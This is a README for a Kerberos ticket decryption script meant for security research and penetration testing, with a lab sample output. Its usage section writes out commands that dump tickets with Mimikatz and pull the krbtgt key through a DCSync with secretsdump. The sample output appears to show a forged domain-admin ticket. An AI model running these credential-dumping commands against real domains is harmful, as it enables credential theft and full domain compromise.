# Kerberos Ticket Decryptor

## Overview

**Kerberos Ticket Decryptor** is a Python script designed to decrypt Kerberos TGT and Service Tickets for analysis and security research. It extracts authentication and PAC (Privilege Attribute Certificate) data, helping in forensic investigations and penetration testing.

The original code which is the base of this script is available from the following repository: [https://gist.github.com/xan7r/ca99181e3d45ee2042425f4f9181e614#file-decryptkerbticket-py](https://gist.github.com/xan7r/ca99181e3d45ee2042425f4f9181e614#file-decryptkerbticket-py)

## Features

- Supports decryption of **TGT** and **TGS** tickets.
- Extracts and displays **PAC data** (Effective Name, User ID, Group Memberships, etc.).
- Supports **ccache** and **kirbi** formats.
- Provides user account control flags and security identifiers translation.
- Handles AES-128, AES-256, and RC4-HMAC encryption.


## Installation

Clone the repository:

```sh
git clone https://github.com/yourusername/kerberos-ticket-decryptor.git
cd kerberos-ticket-decryptor
python3 -m virtualenv venv
source venv/bin/activate
pip3 install -r requirements.txt
```

## Usage

### Obtain Kerberos Tickets

```bash
# Extract Kerberos tickets using Mimikatz
sekurlsa::tickets /export

# Convert to ccache format (optional):
kekeo "misc::convert ccache <ticketName.kirbi>"

# Extract the AES-256 key using DCSync:
secretsdump.py -just-dc-user krbtgt@<domain>
```

### Decrypting a Ticket

```bash
python3 krbdecrypt.py -k 15[...]8 -t randomuser.ccache
```

```bash
[+] TICKET LOADED SUCCESSFULLY
[+] DECRYPTING TICKET
[+] AUTHORIZATION DATA:

Client:          randomuser@DOLLARCORP.MONEYCORP.LOCAL
Server:          krbtgt/DOLLARCORP.MONEYCORP.LOCAL@DOLLARCORP.MONEYCORP.LOCAL
Domain Name:     DOLLARCORP.MONEYCORP.LOCAL
Signet User:     krbtgt
Ticket Type:     TGT
Encryption:      aes256-cts-hmac-sha1-96
Username:        randomuser
Auth Time:       2025.01.10 04:38:02
Start Time:      2025.01.10 04:38:02
End Time:        2035.01.08 04:38:02
Renew Time:      2035.01.08 04:38:02


[+] PAC DATA:

EffectiveName:            randomuser
FullName:                 N/A
LogonScript:              N/A
ProfilePath:              N/A
HomeDirectory:            N/A
HomeDirectoryDrive:       N/A
LogonCount:               500
BadPasswordCount:         0
UserId:                   500
UserSid:                  S-1-5-21-719815819-3726368948-3917688648-500
PrimaryGroupId:           513
GroupCount:               5
GroupIds:                 [513, 512, 520, 518, 519]
FriendlyGID:              Domain Users (513), Domain Admins (512), Group Policy Creator Owners (520), Schema Admins (518), Enterprise Admins (519)
UserFlags:                0
UserSessionKey:           b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
LogonServer:              N/A
LogonDomainName:          DOLLARCORP.MONEYCORP.LOCAL
DomainSid:                S-1-5-21-719815819-3726368948-3917688648
LMKey:                    b'\x00\x00\x00\x00\x00\x00\x00\x00'
UserAccountControl:       NORMAL_ACCOUNT, LOCKOUT
SubAuthStatus:            0
LastSuccessfulILogon:     0
LastFailedILogon:         0
FailedILogonCount:        0
Reserved3:                0
SidCount:                 0
ExtraSids:                
ResourceGroupDomainSid:   b''
ResourceGroupCount:       0
ResourceGroupIds:         b''
```
